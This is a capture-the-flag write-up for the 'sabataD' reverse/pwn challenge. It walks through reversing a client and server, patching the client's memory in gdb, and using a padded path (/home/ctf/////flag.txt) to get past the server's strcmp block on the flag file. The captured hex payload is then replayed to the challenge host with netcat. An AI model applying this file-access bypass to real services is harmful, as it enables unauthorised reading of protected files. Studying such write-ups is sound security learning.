[../](../../)

# sabataD

## reverse / pwn - Points: 220

> !tuo ti kcehc s'tel ,woW !llewsa ti rof ipa na tuo gnivig era yeht dna ho ,esabatad looc repus wen a evah elgoog draeh i
>
> nc 13.48.192.7 50000
>
> [client](client)
>
> [server](server)

## Solution

You were given two programs, one acts as a server and the other one as a client. Obviously the server is the remote target that you have to exploit to get the flag.

So lets check how these two programs work and interact with each other. They are configured to run locally by default, so you can simply run first the `server` and then the `client` afterwards. The client first asks for a name and you have to find the correct username to proceed.

When you open the `server` binary in `Ghidra`, you can see that there is a `strcmp` with the hardcoded string `watevr-admin` at `0x101042`, so you have to use this username.

You can also see another `strcmp` right after it that checks for the file path `/home/ctf/flag.txt` and should probably prohibit the access to that file. This hints us that we have to access that file on the remote server, so I created that file locally.

When entering that username, the server first crashes for me, so I started debugging it in `gdb`, where I could observe that it tries to access the file `/home/ctf/database.txt`, which not exists on my machine. So I also created that file at this path with some random content and then the server was able to open that file and returned its contents to the client.

But where comes that filename from? I could not find that string in any way in the server program, so it must be requested by the client program. Now I started `wireshark` and captured the local network traffic at the port the programs are configured to use, which is `1337`, to see how the data exchange between server and client looks like.

The data for the request looks like this:

	536a2f726e7567676270727a75697220652f732d70656e676271737a7a2f20767173616e765f67795f6e725f6f205f6e6a5f66765f72675f2e755f67205f6b765f67615f5f715f5f725f5f6b5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f3234000a005f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f000000000000000000000000000000000000000000000000

When you decode that hexstring, it contains the following:

	Sj/rnuggbprzuir e/s-pengbqszz/ vqsanv_gy_nr_o _nj_fv_rg_.u_g _kv_ga__q__r__k___________________________________________________________________________24\x00\n\x00____________________\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

It seems we can not simply replace that file path to request access to the `/home/ctf/flag.txt`, so its time to analyze the client binary in `Ghidra`. I first searched for that string that contains the file path and could find the bytes at `0x100cc3`, `0x100ccd`, `0x100ce5`:

	  local_1b8 = 0x74632f656d6f682f;
	  local_1b0 = 0x6162617461642f66;
	  local_1a8 = 0x7478742e6573;

If you decode them you get `/home/ctf/database.txt`, so I tried to patch the bytes to let them contain `/home/ctf/flag.txt`. I decided to try it directly inside `gdb`. I set a breakpoint before the use of that addresses, e.g. at the start of the function at `0x100c4a`. Keep in mind that we have to store the string bytes in reverse order due to Big-Endianness.

 - `local_1b8` contains the first 8 bytes of the path, which is `tc/emoh/`, so nothing to patch here.
 - `local_1b0` contains `abatad/f` (`0x6162617461642f66`), so lets change it to `t.galf/f` (`0x742e67616c662f66`)
 - `local_1a8` contains `txt.es` (`0x7478742e6573`), so lets change it to `xt` (`0x000000007478`)

To modify the addresses I used the following commands inside `gdb`:

	set {int}0x0000555555554ccd = 0x6c662f66
	set {int}0x0000555555554cd1 = 0x742e6761
	set {int}0x0000555555554ce5 = 0x00007478
	set {int}0x0000555555554ce9 = 0x00000000

Then I continued execution and it seemed to work that the client now requests another file, but again the server crashed. Inside `gdb` I could see that the server now receives the following:

	x/s 0x7fffffffe010-0x220
	0x7fffffffddf0:	"/home/ctf/flag.txt\367\367\377\177"

So there are 4 non-printable extra bytes that corrupt the filename. This is probably due to the fact, that the filename is 4 characters shorter now? So I simply added some padding and changed the bytes so that the file path now contains `/home/ctf/////flag.txt` what is still evaluated to `/home/ctf/flag.txt`. (Obviously this also solves the access to the prohibited file path via that `strcmp` in the server)

	set {int}0x0000555555554ccd = 0x2f2f2f66
	set {int}0x0000555555554cd1 = 0x6c662f2f
	set {int}0x0000555555554ce5 = 0x742e6761
	set {int}0x0000555555554ce9 = 0x00007478

And it works! Now I get the contents of the `flag.txt` file, which I created at the beginning. Then I captured the request payload again with `wireshark` and sent it to the remote server and received the flag! :)

		python2 -c "print('536a2f726e7567676270727a75697220652f732d70656e676271737a7a2f20762f73612f765f2f795f2f725f73205f796a5f6e765f74675f2e755f67205f6b765f67615f5f715f5f725f5f6b5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f3134000a005f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f5f000000000000000000000000000000000000000000000000'.decode('hex'))" | nc 13.48.192.7 50000

flag: `watevr{sql_is_overrated_use_txt_instead!_youtube.com/watch?v=7PCkvCPvDXk}`